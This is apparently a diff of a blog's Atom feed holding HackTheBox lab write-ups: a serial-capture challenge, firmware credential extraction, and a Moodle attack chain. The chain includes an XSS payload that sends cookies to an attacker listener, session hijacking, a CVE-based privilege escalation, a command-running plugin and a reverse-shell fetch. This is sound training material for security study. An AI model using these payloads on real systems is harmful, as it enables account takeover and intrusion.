@@ -1,34 +1,127 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-04-06T10:28:17-04:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">#keepLearning</title><subtitle>HackTheBox write-ups for retired boxes and challenges.</subtitle><author><name>Philipp Menner</name></author><entry><title type="html">Writeup: HackTheBox - Schooled</title><link href="http://localhost:4000/boxes/Schooled/" rel="alternate" type="text/html" title="Writeup: HackTheBox - Schooled" /><published>2021-04-04T21:33:36-04:00</published><updated>2021-04-04T21:33:36-04:00</updated><id>http://localhost:4000/boxes/Schooled</id><content type="html" xml:base="http://localhost:4000/boxes/Schooled/">&lt;h1 id=&quot;overview&quot;&gt;Overview&lt;/h1&gt;
-&lt;p&gt;home page:&lt;/p&gt;
-&lt;ul&gt;
-  &lt;li&gt;mentioning moodle&lt;/li&gt;
-  &lt;li&gt;hostname admissions@schooled.htb&lt;/li&gt;
-  &lt;li&gt;phillips_manuel@staff.schooled.htb
-We find the moodle subdomain by fuzzing:
-    &lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;ffuf &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://schooled.htb &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Host: FUZZ.schooled.htb&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-fw&lt;/span&gt; 5338
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.0">Jekyll</generator><link href="https://vpm.rocks/feed.xml" rel="self" type="application/atom+xml" /><link href="https://vpm.rocks/" rel="alternate" type="text/html" /><updated>2021-04-17T11:56:42-04:00</updated><id>https://vpm.rocks/feed.xml</id><title type="html">#keepLearning</title><subtitle>HackTheBox write-ups for boxes and challenges.</subtitle><author><name>Philipp Menner</name></author><entry><title type="html">HackTheBox - Debugging Interface</title><link href="https://vpm.rocks/protected/debugging_interface/" rel="alternate" type="text/html" title="HackTheBox - Debugging Interface" /><published>2021-04-16T21:33:36-04:00</published><updated>2021-04-16T21:33:36-04:00</updated><id>https://vpm.rocks/protected/debugging_interface</id><content type="html" xml:base="https://vpm.rocks/protected/debugging_interface/">&lt;h1 id=&quot;overview&quot;&gt;Overview&lt;/h1&gt;
+&lt;p&gt;Neat little challenge to learn the basics.&lt;/p&gt;
+
+&lt;h1 id=&quot;getting-started&quot;&gt;Getting started&lt;/h1&gt;
+&lt;p&gt;Before getting into it we read the challenge description&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;We accessed the embedded device’s asynchronous serial debugging interface while it was operational and captured some messages that were being transmitted over it. Can you decode them?&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;and note the captured data used asynchronous serial communication. Looking at file included in the challenge we discover a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.sal&lt;/code&gt; file which is a capture from &lt;a href=&quot;https://www.saleae.com/downloads/&quot;&gt;Salae Logic analyiser&lt;/a&gt;.&lt;/p&gt;
+&lt;h1 id=&quot;analysing-the-data&quot;&gt;Analysing the data&lt;/h1&gt;
+&lt;p&gt;After opening the file we choose &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Async Serial&lt;/code&gt; as analyser. We also need to specify the channel, which is 0, and the baud rate for which we select the frequently used 9600 bits/s. This results in errors and, maybe even more importantly, in unreadable gibberish, which usually hints at a faulty baud rate.
+&lt;img src=&quot;/assets/images/debugging_interface/step1.png&quot; alt=&quot;&quot; /&gt;
+&lt;img src=&quot;/assets/images/debugging_interface/step2.png&quot; alt=&quot;&quot; /&gt;
+However selecting different common &lt;a href=&quot;https://en.wikipedia.org/wiki/Serial_port&quot;&gt;baud rates&lt;/a&gt; such as 115200 did not improve the situation.
+I then noticed the extensions section which listed an extension called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Baud rate estimate&lt;/code&gt; which claims to extract the baud rate of a digital signal, so let’s give it a shot.
+&lt;img src=&quot;/assets/images/debugging_interface/baud_rate.png&quot; alt=&quot;&quot; /&gt;
+To use the extension we need to quickly install it and add a measurement. To do this we click and drag over the signal and a box with information will pop up and show the baud rate with a frequency of 31.23 kHz. Entering this baud rate in the async serial settings will show readable text which is a good sign.
+Switching to the terminal view will show the whole text and the flag at bottom.
+&lt;img src=&quot;/assets/images/debugging_interface/flag.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;</content><author><name>Philipp Menner</name></author><category term="protected" /><category term="hardware" /><category term="baud" /><summary type="html">Write-up of the challenge Debugging Interface from Hack The Box</summary></entry><entry><title type="html">HackTheBox - The Needle</title><link href="https://vpm.rocks/protected/theneedle/" rel="alternate" type="text/html" title="HackTheBox - The Needle" /><published>2021-04-16T21:33:36-04:00</published><updated>2021-04-16T21:33:36-04:00</updated><id>https://vpm.rocks/protected/theneedle</id><content type="html" xml:base="https://vpm.rocks/protected/theneedle/">&lt;h1 id=&quot;overview&quot;&gt;Overview&lt;/h1&gt;
+&lt;p&gt;Another neat little challenge to learn some basics.&lt;/p&gt;
+
+&lt;h1 id=&quot;getting-started&quot;&gt;Getting started&lt;/h1&gt;
+&lt;p&gt;As the challenge description did not really matter for me I’m skipping it here. We start by taking a look at the file given:&lt;/p&gt;
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;file firmware.bin
+&lt;span class=&quot;go&quot;&gt;firmware.bin: Linux kernel ARM boot executable zImage (big-endian)
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;binwalk firmware.bin 
+&lt;span class=&quot;go&quot;&gt;
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             Linux kernel ARM boot executable zImage (big-endian)
+14419         0x3853          xz compressed data
+14640         0x3930          xz compressed data
+538952        0x83948         Squashfs filesystem, little endian, version 4.0, compression:xz, size: 2068458 bytes, 995 inodes, blocksize: 262144 bytes, created: 2021-03-11 03:18:10
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;binwalk&lt;/code&gt; shows a squashfs filesystem which probably contains a linux directory structure when we uncompress it. To do this we use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dd&lt;/code&gt;:&lt;/p&gt;
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;dd &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;firmware.bin &lt;span class=&quot;nv&quot;&gt;of&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;squash &lt;span class=&quot;nv&quot;&gt;skip&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;538952 &lt;span class=&quot;nv&quot;&gt;bs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1
+&lt;span class=&quot;go&quot;&gt;16238264+0 records in
+16238264+0 records out
+16238264 bytes (16 MB, 15 MiB) copied, 42.0016 s, 387 kB/s
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; input file, of &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; output file
+&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;skip &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; skip first n bytes, bs &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;read &lt;/span&gt;one byte at a &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;We now have the a file called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;squash&lt;/code&gt; which contains the Squashfs filesystem which we can unpack:&lt;/p&gt;
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;unsquashfs squash
+&lt;span class=&quot;go&quot;&gt;Parallel unsquashfs: Using 4 processors
+892 inodes (892 blocks) to write
+
+
+create_inode: could not create character device squashfs-root/dev/console, because you're not superuser!
+[=======================================================================================================================================================================================================| ] 891/892  99%
+
+created 713 files
+created 103 directories
+created 178 symlinks
+created 0 devices
+created 0 fifos
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;We now see a new directory called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;squashfs-root&lt;/code&gt; which contains our linux directory tree:&lt;/p&gt;
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;squashfs-root/
+&lt;span class=&quot;gp&quot;&gt;squashfs-root$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;bin  dev  etc  lib  mnt  overlay  proc  rom  root  sbin  sys  tmp  usr  var  www
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;So where to start? I thought the best shot is to look at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc&lt;/code&gt; to see what is being started at boot but did not find anything too interesting in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/init.d&lt;/code&gt;. However, I found the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;scripts&lt;/code&gt; folder which sounded non-standard and its contents looked promising:&lt;/p&gt;
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;telnetd.sh 
+&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;/bin/sh
+&lt;span class=&quot;go&quot;&gt;sign=`cat /etc/config/sign`
+TELNETD=`rgdb`
+TELNETD=`rgdb -g /sys/telnetd`
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;if [ &quot;$&lt;/span&gt;TELNETD&lt;span class=&quot;s2&quot;&gt;&quot; = &quot;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot; ]; then
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;	echo &quot;Start telnetd ...&quot; &amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/dev/console
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;	if [ -f &quot;/usr/sbin/login&quot; ];&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;then
+&lt;/span&gt;&lt;span class=&quot;go&quot;&gt;		lf=`rgbd -i -g /runtime/layout/lanif`
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;		telnetd -l &quot;/usr/sbin/login&quot; -u Device_Admin:$&lt;/span&gt;sign &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$lf&lt;/span&gt; &amp;amp;
+&lt;span class=&quot;go&quot;&gt;	else
+		telnetd &amp;amp;
+	fi
+fi
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; ../config/sign
+&lt;span class=&quot;gp&quot;&gt;qS6-X/n]u&amp;gt;&lt;/span&gt;fVfAt!
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Trying these credentials out:&lt;/p&gt;
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;nc 139.59.178.146 32749
+&lt;span class=&quot;go&quot;&gt;hwtheneedle-241898-867b7c7c4d-g2xvd login: Device_Admin
+Device_Admin
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;Password: qS6-X/n]u&amp;gt;&lt;/span&gt;fVfAt!
+&lt;span class=&quot;go&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;hwtheneedle-241898-867b7c7c4d-g2xvd:~$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt;
+&lt;span class=&quot;go&quot;&gt;ls
+flag.txt
+&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;hwtheneedle-241898-867b7c7c4d-g2xvd:~$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;flag.txt 
+&lt;span class=&quot;go&quot;&gt;cat flag.txt
+HTB{4_hug3_blund3r_d289a1_!!}
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Nice easy little challenge.&lt;/p&gt;</content><author><name>Philipp Menner</name></author><category term="protected" /><category term="hardware" /><summary type="html">Write-up of the hardware challenge The Needle from Hack The Box</summary></entry><entry><title type="html">Writeup: HackTheBox - Schooled</title><link href="https://vpm.rocks/protected/Schooled-active/" rel="alternate" type="text/html" title="Writeup: HackTheBox - Schooled" /><published>2021-04-04T21:33:36-04:00</published><updated>2021-04-04T21:33:36-04:00</updated><id>https://vpm.rocks/protected/Schooled-active</id><content type="html" xml:base="https://vpm.rocks/protected/Schooled-active/">&lt;h1 id=&quot;overview&quot;&gt;Overview&lt;/h1&gt;
+&lt;p&gt;I always like to see different operating systems than Linux and Windows so I looked forward for this FreeBSD box and was not disappointed. Most of the user part required exploiting the learning platform &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Moodle&lt;/code&gt; which I enjoyed even more so because of being a teacher myself. For root, I had a déjà vu, because it required building and installing a malicious package via a package manager (here pkg) - we have seen similar privilege escalations one week earlier on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Armageddon&lt;/code&gt; (snap) and a little while ago  on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;onetwoseven&lt;/code&gt; (apt).&lt;/p&gt;
+&lt;h1 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h1&gt;
+&lt;p&gt;Nmap reveals port 80 so we just browse there and see what we can get. It appears to be some sort of a learning site, mentioning Moodle, revealing the hostname &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;schooled.htb&lt;/code&gt; and a possible user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;phillips_manuel@staff.schooled.htb&lt;/code&gt;. Other than that, the site is pretty much empty, so we start fuzzing for subdirectories and subdomains.
+This reveals the subdomain &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;moodle.schooled.htb&lt;/code&gt;:&lt;/p&gt;
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;ffuf &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://schooled.htb &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Host: FUZZ.schooled.htb&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-fw&lt;/span&gt; 5338
 &lt;span class=&quot;go&quot;&gt;[snip]
 moodle                  [Status: 200, Size: 84, Words: 5, Lines: 2]
 :: Progress: [4989/4989] :: Job [1/1] :: 451 req/sec :: Duration: [0:00:15] :: Errors: 0 ::
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
-  &lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Adding the subdomain to the hosts file and browsing there reveales a login page and some courses and their teachers&lt;/p&gt;
-&lt;h1 id=&quot;moodle-enumeration&quot;&gt;Moodle enumeration&lt;/h1&gt;
-&lt;p&gt;When logging in we notice we need to add a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;student.schooled.htb&lt;/code&gt; email address:&lt;/p&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Adding the subdomain to the hosts file and browsing there reveales a login page, some courses and their teachers.&lt;/p&gt;
+&lt;h2 id=&quot;moodle-enumeration&quot;&gt;Moodle enumeration&lt;/h2&gt;
+&lt;p&gt;When trying to register we notice we need to add a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;student.schooled.htb&lt;/code&gt; email address:&lt;/p&gt;
 &lt;blockquote&gt;
-  &lt;p&gt;This email is not one of those that are allowed (student.schooled.htb)
-and upon logging in we see that there is also &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;staff.schooled.htb&lt;/code&gt; available. Furthermore we are allowed to enroll to the Maths course and read an Announcement by Manuel Phillips (phillips_manuel@staff.schooled.htb) asking us to set a “MoodleNet profile”:
-This is a self enrollment course. For students who wish to attend my lectures be sure that you have your MoodleNet profile set.&lt;/p&gt;
+  &lt;p&gt;This email is not one of those that are allowed (student.schooled.htb)&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;a href=&quot;/assets/images/schooled/moodle.png&quot; height=&quot;360px&quot; width=&quot;180px&quot; class=&quot;align-right&quot;&gt;&lt;/a&gt;
+and upon logging in we see that there is also &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;staff.schooled.htb&lt;/code&gt; available. Furthermore we are allowed to enroll to the Maths course and read an Announcement by Manuel Phillips (phillips_manuel@staff.schooled.htb) asking us to set a “MoodleNet profile”:&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;This is a self enrollment course. For students who wish to attend my lectures be sure that you have your MoodleNet profile set.&lt;/p&gt;
 
   &lt;p&gt;Students who do not set their MoodleNet profiles will be  removed from the course before the course is due to start and I will be checking all students who are enrolled on this course.&lt;/p&gt;
 &lt;/blockquote&gt;
 
-&lt;p&gt;Searching this term shows serious XSS vulnerabilities and we can test this by browsing to our profile page and setting &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&lt;/code&gt; as MoodleNet profile. And indeed when browsing to our profile we are greeted by our beloved alert(1) message.
+&lt;p&gt;Searching this term shows a serious XSS vulnerability and we can test this by browsing to our profile page and setting &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&lt;/code&gt; as MoodleNet profile. And indeedi, when browsing to our profile we are greeted by our beloved alert(1) message.
 What’s XSS good for? For example for cookie stealing - and this is achieved quite simply:&lt;/p&gt;
 &lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;img&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;onerror=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;this.src='http://10.10.14.11:8000/?c='+document.cookie&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;By using this payload as MoodleNet profile and Manuel Phillips checking our profile every 1-2 minutes we get him to send his MoodleSession cookie to our nc listener:&lt;/p&gt;
+&lt;p&gt;By using this payload as MoodleNet profile Manuel Phillips goes online so we can message him our profile URL. When he clicks the link he triggers the XSS and sends us his MoodleSession cookie to our nc listener:&lt;/p&gt;
 &lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-lnvp&lt;/span&gt; 8000
 &lt;span class=&quot;go&quot;&gt;Ncat: Version 7.91 ( https://nmap.org/ncat )
 Ncat: Listening on :::8000
@@ -47,7 +140,7 @@ Referer: http://moodle.schooled.htb/moodle/user/profile.php?id=28
 &lt;p&gt;After overwriting our cookie with his and refreshing the page we upgraded from a student to teacher.&lt;/p&gt;
 &lt;h2 id=&quot;from-teacher-to-manager-to-rce&quot;&gt;From teacher to manager to RCE&lt;/h2&gt;
 &lt;p&gt;We pretty much follow the CVE-2020-24321 outlined in detail &lt;a href=&quot;https://www.youtube.com/watch?v=BkEInFI4oIU&quot;&gt;here&lt;/a&gt;.
-After catching and modifying the enroll request for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Lianne Carter&lt;/code&gt; and logging in as her we see the button &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Site administration&lt;/code&gt; on the bottom left hand side. This is a sure sign that we are on the right track. Then:&lt;/p&gt;
+After catching and modifying the enroll request for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Lianne Carter&lt;/code&gt; (not sure why it has to be her, I tried multiple users and other staff members but it worked only for her) and logging in as her we see the button &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Site administration&lt;/code&gt; on the bottom left hand side. This is a sure sign that we are on the right track. Then:&lt;/p&gt;
 
 &lt;p&gt;-&amp;gt; Users -&amp;gt; Define Roles -&amp;gt; Manager -&amp;gt; Edit -&amp;gt; Scrolling all the way down -&amp;gt; Turn intercept on in Burp -&amp;gt; Save changes in moodle -&amp;gt; replace the huge payload after &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;amp;return=...&lt;/code&gt; with the payload from the author’s &lt;a href=&quot;https://github.com/HoangKien1020/CVE-2020-14321&quot;&gt;github&lt;/a&gt; page.&lt;/p&gt;
 
@@ -55,7 +148,7 @@ After catching and modifying the enroll request for &lt;code class=&quot;languag
 Site administration -&amp;gt; Plugins -&amp;gt; Install plugins -&amp;gt; Choose a file… -&amp;gt; Upload a file -&amp;gt; Choose file -&amp;gt; rce.zip -&amp;gt; upload this file -&amp;gt; Install plugin from the ZIP file
 Browsing to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php?cmd=whoami&lt;/code&gt; should now display the user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www&lt;/code&gt;.&lt;/p&gt;
 
-&lt;p&gt;We need to be quick now because our php file that gives us rce will disappear relatively fast. First I did not manage to get a reverse shell and enumerated manually using this small shell. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;config.php&lt;/code&gt; file from moodle revealed mysql creds:&lt;/p&gt;
+&lt;p&gt;We need to be quick for the next step because our php file will disappear relatively fast. First I did not manage to get a reverse shell and enumerated manually using this uncomfortable shell. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;config.php&lt;/code&gt; file from moodle revealed mysql creds:&lt;/p&gt;
 &lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CFG&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dbtype&lt;/span&gt;    &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'mysqli'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
 &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CFG&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dblibrary&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'native'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
 &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CFG&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dbhost&lt;/span&gt;    &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'localhost'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
@@ -65,7 +158,7 @@ Browsing to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;h
 &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CFG&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;prefix&lt;/span&gt;    &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'mdl_'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;As I cannot access this DB from our simple shell and the PW doesnt work for the users jamie and steve on the box I went back to obtaining a shell. The major hurdle for this was &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;curl&lt;/code&gt; not being in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$PATH&lt;/code&gt; so I had to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;find / -name curl 2&amp;gt;/dev/null&lt;/code&gt; and call it with an absolute path to upload a shell script to execute the reverse shell:&lt;/p&gt;
-&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;```&lt;/span&gt;python &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; http.server 1111
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;python &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; http.server 1111
 &lt;span class=&quot;go&quot;&gt;Serving HTTP on 0.0.0.0 port 1111 (http://0.0.0.0:1111/) ...
